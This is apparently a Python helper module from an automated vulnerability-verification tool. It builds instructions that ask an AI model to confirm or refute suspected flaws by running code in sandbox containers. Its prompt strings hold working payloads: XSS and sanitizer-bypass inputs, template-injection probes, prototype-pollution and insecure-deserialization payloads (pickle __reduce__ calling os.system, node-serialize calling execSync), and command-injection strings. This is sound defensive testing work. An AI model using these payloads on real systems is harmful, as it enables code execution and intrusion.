"""Shared brief/scaffold helpers for the investigation loop -- extracted so BOTH the legacy `state.py`
run_loop AND the new Stage-3 `prove.py` can build the model's investigation brief WITHOUT importing
`state` (whose top-level pulls the whole legacy graph: discover, provision, oracle, bizlogic, browser...).

Pure and dependency-light on purpose: only stdlib + a duck-typed `candidate` (needs .file/.line/.unit/
.cwe/.family/.sink). No model, no docker, no tree-sitter at import.
"""
from pathlib import Path


def _code_window(path, line, ctx=22):
    """Line-numbered source around the candidate's sink -- the code the model investigates."""
    try:
        lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
    except OSError:
        return ""
    lo, hi = max(0, (line or 1) - 1 - ctx), min(len(lines), (line or 1) + ctx)
    return "\n".join(f"{i + 1}: {lines[i]}" for i in range(lo, hi))


def _rel(path, target):
    try:
        return str(Path(path).resolve().relative_to(Path(target).resolve())).replace("\\", "/")
    except Exception:
        return Path(path).name


def _is_js(path):
    return (path or "").lower().endswith((".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx"))


_XSS_CWES = {"CWE-79", "CWE-80", "CWE-83", "CWE-116"}   # classes that need a real browser to PROVE (render + observe)

# A URL/HTML SANITIZER or ESCAPER is proven by its RETURN VALUE (does the danger survive?), not by a DOM
# render -- so it takes the `call` scaffold + a dangerous payload, no browser. Only meaningful for XSS/redirect.
_SANITIZER_VERB = ("sanitiz", "clean", "escape", "purif", "scrub", "normaliz", "encode", "strip", "safe")
_SANITIZER_NOUN = ("url", "uri", "href", "link", "redirect", "html", "xss", "markup")


def _is_sanitizer(candidate):
    cwe = getattr(candidate, "cwe", "") or ""
    if cwe not in _XSS_CWES and cwe != "CWE-601":
        return False
    hay = ((getattr(candidate, "unit", "") or "") + " " + (getattr(candidate, "sink", "") or "")).lower()
    return any(v in hay for v in _SANITIZER_VERB) and any(n in hay for n in _SANITIZER_NOUN)


# class CWE -> the proof-shape brief mode (the model's proof recipe for that class). Canary classes
# (cmd/sqli/nosqli/ssrf/path) never reach here -- rung1 witnesses them deterministically.
_MODE_BY_CWE = {"CWE-1336": "ssti", "CWE-94": "ssti", "CWE-1321": "protopoll", "CWE-502": "deser"}


def _proof_mode(candidate):
    """Pick the investigate proof shape for a candidate: sanitizer (return-value) > per-class brief
    (ssti/protopoll/deser) > render (DOM XSS) > call (default). Used by prove and patch so the scaffold,
    image, and brief stay consistent."""
    if _is_sanitizer(candidate):
        return "sanitizer"
    cwe = getattr(candidate, "cwe", "") or ""
    if cwe in _MODE_BY_CWE:
        return _MODE_BY_CWE[cwe]
    if cwe in _XSS_CWES:
        return "render"
    return "call"


def _image_for(path):
    """A runtime/toolchain image that can BUILD+RUN this candidate's language (the model can install more if
    it needs). Compiled languages get an SDK image so the model can actually compile a repro."""
    if _is_js(path):
        return "node:20-slim"
    p = (path or "").lower()
    for ext, img in ((".php", "php:8.2-cli"), (".rb", "ruby:3-slim"), (".go", "golang:1-alpine"),
                     (".java", "eclipse-temurin:21-jdk"), (".cs", "mcr.microsoft.com/dotnet/sdk:8.0"),
                     (".rs", "rust:1-slim"),
                     (".cc", "gcc:13"), (".cpp", "gcc:13"), (".cxx", "gcc:13"), (".hpp", "gcc:13"),
                     (".hh", "gcc:13"), (".hxx", "gcc:13"), (".c", "gcc:13"), (".h", "gcc:13")):
        if p.endswith(ext):
            return img
    return "python:3.12-slim"


def _brief_for(candidate, target, reason, scaffold=None, mode="call"):
    rel = _rel(candidate.file, target)
    code = _code_window(candidate.file, getattr(candidate, "line", 0))
    fn = str(candidate.unit).split("(")[0].strip()
    extra = ""
    if scaffold:
        cont, run_hint = scaffold
        if mode == "render":
            ex = run_hint.replace("<payload>", "<img src=x onerror=window.__wave=1>")
            extra = (f"\nA reproduction scaffold is ready at {cont} -- it loads this module, calls "
                     f"{fn}(YOUR_PAYLOAD), renders the output in headless chromium, and prints "
                     f"WAVE_RENDER_CANARY and WAVE_OUTPUT. Use this EXACT canary payload (no quotes, so the "
                     f"shell can't mangle it, and an event handler because setContent won't run <script>):"
                     f"\n  {ex}\n"
                     f"If WAVE_RENDER_CANARY prints 1, the payload EXECUTED -> conclude confirmed. If it "
                     f"prints 'none', LOOK AT WAVE_OUTPUT: if your <img tag appears RAW/unescaped there, the "
                     f"output IS reflected unescaped = still XSS (the canary just misfired -- that is enough "
                     f"to confirm). Only conclude refuted if WAVE_OUTPUT shows it ESCAPED (e.g. &lt;img). "
                     f"Supply ONLY the payload; the scaffold owns the browser/module glue.")
        elif mode == "sanitizer":
            def _p(pl):
                return run_hint.replace("<payload>", pl)
            extra = (
                f"\nThis is a URL/HTML SANITIZER or ESCAPER -- it is NOT proven by rendering, but by its "
                f"RETURN VALUE: feed it a DANGEROUS input and check whether the danger SURVIVES. The scaffold "
                f"at {cont} calls {fn}(ARG) and prints WAVE_RESULT (the return value). Run it with these "
                f"payloads, ONE PER RUN, and read WAVE_RESULT:\n"
                f"  {_p('javascript:alert(1)')}\n"
                f"  {_p('JaVaScRiPt:alert(1)')}          (case bypass)\n"
                f"  {_p('  javascript:alert(1)')}        (leading whitespace/control-char bypass)\n"
                f"  {_p('data:text/html,<script>alert(1)</script>')}\n"
                f"CONFIRMED (the sanitizer is BYPASSED) if WAVE_RESULT still yields an EXECUTABLE URL -- "
                f"after trimming whitespace/control chars it STILL starts with 'javascript:', 'data:text/html' "
                f"or 'vbscript:' (for an OPEN-REDIRECT finding: an absolute 'http(s)://' or a protocol-relative "
                f"'//<host>' external URL). REFUTED only if the output is NEUTRALIZED: emptied, 'about:blank', "
                f"the scheme stripped or entity/percent-encoded (e.g. '&#106;' or '%6a'), or forced to a "
                f"relative path. Cite the exact WAVE_RESULT string as the evidence. Supply ONLY the arg; the "
                f"scaffold owns the module-loading glue.")
        elif mode == "ssti":
            lines = "\n".join("  " + run_hint.replace("<payload>", p)
                              for p in ("{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"))
            extra = (
                "\nThis is a possible SERVER-SIDE TEMPLATE INJECTION -- prove it by EVALUATION, not by "
                "rendering markup. The scaffold at " + cont + " calls " + fn + "(ARG) and prints WAVE_RESULT. "
                "Feed a template expression and check whether the engine COMPUTES it. Run these, ONE PER RUN, "
                "and read WAVE_RESULT:\n" + lines + "\nCONFIRMED if WAVE_RESULT contains the EVALUATED result "
                "49 (the engine computed 7*7). REFUTED if WAVE_RESULT contains the payload LITERALLY (the text "
                "{{7*7}} unrendered) or HTML-escaped -- then it is data, not a template. Cite the WAVE_RESULT "
                "that shows 49. Supply ONLY the arg.")
        elif mode == "protopoll":
            probe = ("node -e \"const m=require('/work/REL'); m.FN({}, JSON.parse(process.argv[1])); "
                     "console.log('POLLUTED:', ({}).wavePolluted)\" "
                     "'{\"__proto__\":{\"wavePolluted\":\"WZ1\"}}'").replace("REL", rel).replace("FN", fn)
            extra = (
                "\nThis is a possible PROTOTYPE POLLUTION (a recursive merge/set/extend that copies "
                "attacker-controlled keys). Prove it by polluting Object.prototype, then reading a FRESH "
                "object. Write a probe that calls " + fn + " with a __proto__ payload and then reads a NEW "
                "empty object -- adapt the require path + the merge signature:\n  " + probe + "\nCONFIRMED if "
                "a FRESH {} now has wavePolluted equal to your marker (Object.prototype was polluted). REFUTED "
                "if the fresh object stays clean (the key was dropped / own-property guarded). Cite the "
                "'POLLUTED: ...' line as the evidence.")
        elif mode == "deser":
            if (getattr(candidate, "file", "") or "").endswith(".py"):
                craft = ("python3 -c \"import pickle,os,base64; print(base64.b64encode(pickle.dumps("
                         "type('x',(),{'__reduce__':lambda s:(os.system,('touch /work/wave_HIT',))})()"
                         ")).decode())\"")
                note = ("Python pickle: craft a payload whose __reduce__ runs "
                        "os.system('touch /work/wave_HIT'), then feed it to " + fn + " (base64-decode first "
                        "if the sink takes bytes). Generate it with:\n  " + craft)
            else:
                payload = ("'{\"rce\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\')."
                           "execSync(\\'touch /work/wave_HIT\\')}()\"}'")
                note = ("Node node-serialize: feed this payload to " + fn + " (it fires on unserialize):\n  "
                        + payload)
            extra = (
                "\nThis is a possible INSECURE DESERIALIZATION -- prove it with a marker SIDE-EFFECT: a "
                "crafted object that, when deserialized, creates /work/wave_HIT.\n" + note + "\nInvoke the "
                "sink with the payload and, in the SAME command (each command runs in a fresh container), run "
                "`ls -l /work/wave_HIT`. CONFIRMED if the file EXISTS (the payload executed on deserialize). "
                "REFUTED if the load raises / rejects it and no file appears.")
        else:
            extra = (f"\nA reproduction scaffold is ready at {cont} -- it loads this module and calls "
                     f"{fn}(ARG), printing WAVE_RESULT + WAVE_CALL_ERROR. The ARG is parsed as JSON if it can "
                     f"be, so the taint can flow through a PROPERTY -- match the function's signature:\n"
                     f"  - takes a string:  {run_hint.replace('<payload>', '; id')}\n"
                     f"  - takes an object: {run_hint.replace('<payload>', chr(39) + '{{\"path\": \"; id\"}}' + chr(39))}\n"
                     f"  - takes a URL:     pass {chr(39)}{{\"href\":\"https://x/; id\",\"hash\":\"\",\"search\":\"\","
                     f"\"pathname\":\"/x\"}}{chr(39)}\n"
                     f"For OS-command injection the injected command's output is often NOT returned -- inject a "
                     f"MARKER side effect into /work (which persists; each command runs in a fresh container so "
                     f"/tmp does NOT persist). Best: do it in ONE command, e.g. run the scaffold with a payload "
                     f"like `; touch /work/wave_HIT` then `; sleep 1; ls -l /work/wave_HIT` appended -- if the "
                     f"file exists it executed = confirmed. For SQLi/path/etc. read "
                     f"WAVE_RESULT. Supply ONLY the arg; the scaffold owns the module-loading glue. You may still "
                     f"write your own script if it doesn't fit.")
    elif candidate.cwe in _XSS_CWES:
        extra = (
            "\nThis is a possible XSS. A headless browser is available. To PROVE it, RENDER the vulnerable "
            "output with a CANARY payload and check whether it EXECUTED as script. Here is a COMPLETE, "
            "WORKING script -- write it to a file and run `node /tmp/x.js`, only adapting (a) the require "
            "path/module system, (b) which function you call to build the output, (c) the payload:\n"
            "```js\n"
            "const { chromium } = require('playwright');\n"
            "const mod = require('/work/" + rel + "');   // if it uses `export`, use `await import(...)` instead\n"
            "(async () => {\n"
            "  const html = mod." + str(candidate.unit).split('(')[0].strip() + "('<img src=x onerror=\"window.__wave=1\">');  // build output WITH the payload\n"
            "  const b = await chromium.launch({ args: ['--no-sandbox'] });\n"
            "  const p = await b.newPage();\n"
            "  await p.setContent(String(html));\n"
            "  await new Promise(r => setTimeout(r, 300));\n"
            "  console.log('CANARY:', await p.evaluate(() => window.__wave || 'none'));\n"
            "  await b.close();\n"
            "})();\n"
            "```\n"
            "If CANARY prints 1, the payload EXECUTED -> conclude confirmed (evidence: the canary fired). "
            "If it prints 'none' (the output was escaped), the code is safe -> conclude refuted. The repo's "
            "node_modules and tsx are installed; write the script to a file to avoid shell-quoting issues.")
    elif _is_js(candidate.file):
        extra = ("\nThis is JavaScript/TypeScript. `tsx` is installed: run a .ts file or inline TS with "
                 "`tsx -e \"...\"` or `tsx <file>.ts`; the repo's node_modules ARE installed so its "
                 "require/import dependencies resolve. Load the exported function and call it with your "
                 "payload (e.g. `node -e \"require('/work/app').f('; id')\"` or the tsx equivalent).")
    return (f"File: {rel} (mounted at /work/{rel}). Function: {candidate.unit}.\n"
            f"Suspected {candidate.cwe} ({candidate.family}); sink: {candidate.sink}.\n"
            f"A quick automatic check was inconclusive ({reason}).\n\nCode around the sink:\n{code}\n\n"
            f"The whole repository is mounted at your working directory (/work). Prove or refute whether "
            f"this is a REAL, exploitable {candidate.cwe} by running code.{extra}")
